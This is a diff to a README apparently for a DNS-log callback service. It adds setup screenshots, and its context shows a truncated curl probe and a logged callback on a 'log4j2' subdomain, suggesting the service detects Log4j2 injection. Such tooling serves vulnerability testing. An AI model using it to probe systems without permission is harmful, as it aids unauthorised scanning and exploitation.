@@ -48,7 +48,10 @@ chmod +x upApi.sh
 After running the above command, confirm the certonly operation steps
 
 QZPE4B9OQivKZDi7Hq3On1IhhdZiEX2iVJ8ojKuOGsA and cW3h0EExs0HPt-SqwoVa0AV8 replace your
+<img width="832" alt="image" src="https://user-images.githubusercontent.com/18223385/164650694-b35d3e6d-6b8b-4f01-b8c2-9d54269fd53c.png">
 
+<img width="813" alt="image" src="https://user-images.githubusercontent.com/18223385/164650641-cabde872-e7df-4a66-b55e-92a95103e24b.png">
+<img width="530" alt="image" src="https://user-images.githubusercontent.com/18223385/164651541-b07f310d-7fdc-4461-8700-493793d542b7.png">
 
 # How config dns
 - add  hosts
@@ -96,3 +99,4 @@ curl -v -H 'user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Fir
 ```json
 {"ip":"172.70.209.200","domain":"xx22.log4j2.51pwn.com","type":"dnslog","date":"2022-01-23 05:19:53"}                                                                                             
 ```
+
